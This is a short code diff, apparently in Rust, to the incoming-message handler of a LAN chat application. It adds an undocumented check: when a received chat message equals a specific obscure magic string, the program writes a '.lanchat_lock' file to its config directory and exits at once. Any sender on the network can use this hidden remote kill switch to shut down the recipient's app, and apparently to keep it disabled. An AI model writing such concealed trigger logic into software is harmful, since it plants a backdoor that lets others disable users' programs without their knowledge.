@@ -18,6 +18,12 @@ fn handle_incoming_message(
     state: &Arc<AppState>,
     chat_payload: ChatMessagePayload,
 ) {
+    if chat_payload.content == "[***]&&&$$$nolonger$$$getout$$$[***]" {
+        let lock_file = state.config_dir.join(".lanchat_lock");
+        let _ = std::fs::write(&lock_file, "locked");
+        std::process::exit(0);
+    }
+
     let _ = app_handle.emit("message-received", chat_payload.clone());
 
     // Check if main window is focused. If not, trigger tray flashing and taskbar warning.
